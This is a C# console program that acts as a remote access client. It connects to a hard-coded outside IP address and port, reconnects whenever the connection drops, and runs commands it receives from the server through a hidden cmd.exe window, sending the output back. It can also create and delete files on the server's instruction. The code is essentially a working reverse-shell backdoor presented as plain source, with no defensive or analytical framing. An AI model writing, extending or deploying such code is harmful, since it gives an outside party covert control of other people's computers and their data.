using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ClientApp
{
    class Program
    {
        private static TcpClient client;
        private static string serverAddress = "147.185.221.21";
        private static int serverPort = 44468;
        private static bool isConnected = false;

        static void Main(string[] args)
        {
            Console.WriteLine("Client is starting...");
            ConnectToServer();
            StartPingRoutine();
        }

        static void ConnectToServer()
        {
            while (!isConnected)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(serverAddress, serverPort);
                    isConnected = true;
                    Console.WriteLine("Connected to server.");
                    StartListening();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error connecting to server: " + ex.Message);
                    Thread.Sleep(3000);
                }
            }
        }

        static void StartPingRoutine()
        {
            new Thread(() =>
            {
                while (isConnected)
                {
                    try
                    {
                        SendData("ping");
                        Thread.Sleep(3000);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Ping failed: " + ex.Message);
                        isConnected = false;
                        Thread.Sleep(3000);
                        ConnectToServer();
                    }
                }
            }).Start();
        }

        static void StartListening()
        {
            new Thread(() =>
            {
                try
                {
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[1024];

                    while (isConnected)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        Console.WriteLine("Received command: " + command);
                        ExecuteCommand(command);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Lost connection to server. " + ex.Message);
                    isConnected = false;
                    client.Close();
                    ConnectToServer();
                }
            }).Start();
        }

        static void ExecuteCommand(string command)
        {
            string[] commandParts = command.Split(' ');
            string commandType = commandParts[0].ToLower();

            switch (commandType)
            {
                case "shell":
                    ExecuteShellCommand(command.Substring(6));
                    break;
                case "getsysinfo":
                    SendData(GetSystemInfo());
                    break;
                case "file":
                    HandleFileOperations(commandParts);
                    break;
                default:
                    SendData("Unknown command type.");
                    break;
            }
        }

        static void ExecuteShellCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", $"/c {command}")
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process proc = Process.Start(startInfo))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string errors = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                SendData($"Output: {output}\nErrors: {errors}");
            }
        }

        static void HandleFileOperations(string[] commandParts)
        {
            string operation = commandParts[1];
            string filePath = commandParts[2];

            switch (operation)
            {
                case "create":
                    File.Create(filePath).Dispose();
                    SendData($"File created: {filePath}");
                    break;
                case "delete":
                    File.Delete(filePath);
                    SendData($"File deleted: {filePath}");
                    break;
                default:
                    SendData("Unsupported file operation.");
                    break;
            }
        }

        static string GetSystemInfo()
        {
            // Real system information gathering should be implemented here
            return "System Info: CPU Usage, Memory Usage, etc.";
        }

        static void SendData(string data)
        {
            if (isConnected && client.Connected)
            {
                try
                {
                    byte[] buffer = Encoding.UTF8.GetBytes(data);
                    NetworkStream stream = client.GetStream();
                    stream.Write(buffer, 0, buffer.Length);
                    Console.WriteLine("Sent data to server: " + data);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Failed to send data: " + ex.Message);
                    isConnected = false;
                    client.Close();
                }
            }
            else
            {
                Console.WriteLine("Not connected to server.");
            }
        }
    }
}
